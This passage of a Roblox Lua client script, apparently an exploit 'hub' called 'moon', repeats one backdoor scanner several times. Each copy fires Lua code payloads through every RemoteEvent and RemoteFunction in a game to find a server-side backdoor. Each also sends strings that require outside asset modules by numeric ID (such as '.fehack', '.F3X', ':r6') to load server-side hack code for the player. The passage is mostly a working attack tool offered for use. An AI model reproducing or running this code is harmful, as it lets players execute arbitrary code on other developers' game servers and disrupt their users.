		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(7634392335)(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_40);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_4a()
	local script = G2L["4a"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(5115249013).fehack(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_4a);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_54()
	local script = G2L["54"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(14572394952)(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_54);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_5e()
	local script = G2L["5e"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(3436957371):r6(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_5e);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_68()
	local script = G2L["68"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(0x1767bf813)(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_68);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_72()
	local script = G2L["72"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(4869378421).F3X(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_72);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_7c()
	local script = G2L["7c"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(6056559552).load(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_7c);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_86()
	local script = G2L["86"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(6608656220):John(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

